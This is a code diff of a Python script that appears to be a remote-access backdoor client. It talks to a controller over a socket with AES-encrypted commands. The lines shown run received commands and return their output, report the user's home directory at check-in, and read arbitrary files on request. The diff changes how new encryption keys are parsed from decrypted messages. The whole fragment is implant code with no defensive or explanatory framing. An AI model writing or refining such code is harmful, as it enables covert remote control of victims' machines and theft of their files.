@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-import socket, sys, os, subprocess, argparse, time
+import socket, sys, os, subprocess, argparse, time, ast
 from struct import pack
 from Crypto.Cipher import AES
 parser = argparse.ArgumentParser(description='q*bert says hello')
@@ -25,8 +25,8 @@ def do_decrypt(ciphertext):
     obj2 = AES.new(aeskey, AES.MODE_CBC, aesiv)
     message = obj2.decrypt(ciphertext)
     message = message[:-message[-1]]
-    print(message)
-    if message[0] == 'aeskey':
+    if 'aeskey' in message:
+        message = ast.literal_eval(message)
         aeskey = message[1]
         aesiv = message[2]
         return 'Great Success'
@@ -48,8 +48,6 @@ def main():
                 sendit(s, output.stdout)
             elif 'Arsenal' in command:
                 sendit(s, 'Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME'))
-            elif 'aeskey' in command:
-                update_aeskeys(command[1],command[2])
             elif 'get_file' in command:
                 with open(command[1]) as f:
                     tmp = f.read()
